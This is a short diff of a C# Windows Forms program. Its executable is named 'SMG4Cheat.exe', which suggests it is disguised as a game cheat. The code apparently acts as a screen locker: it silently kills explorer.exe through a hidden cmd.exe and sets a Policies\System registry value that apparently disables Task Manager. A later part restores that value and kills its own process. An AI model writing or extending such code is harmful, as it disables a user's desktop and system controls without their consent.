@@ -43,7 +43,6 @@ namespace WindowsFormsApp3
             byebye_exp.WindowStyle = ProcessWindowStyle.Hidden;
             byebye_exp.Arguments = @"/k taskkill /f /im explorer.exe";
             Process.Start(byebye_exp);
-            Process.Start(@"C:\Windows\System32\LogonUI.exe");
             RegistryKey regkey;
             string keyValueInt = "1";
                 string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
@@ -85,6 +84,11 @@ namespace WindowsFormsApp3
                 proc.StartInfo.UseShellExecute = false;
                 proc.Start();
                 System.Windows.Forms.Application.Exit();
+                ProcessStartInfo byebye_exp = new ProcessStartInfo();
+                byebye_exp.FileName = "cmd.exe";
+                byebye_exp.WindowStyle = ProcessWindowStyle.Hidden;
+                byebye_exp.Arguments = @"/k taskkill /f /im SMG4Cheat.exe";
+                Process.Start(byebye_exp);
                 RegistryKey regkey;
                 string keyValueInt = "0";
                 string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
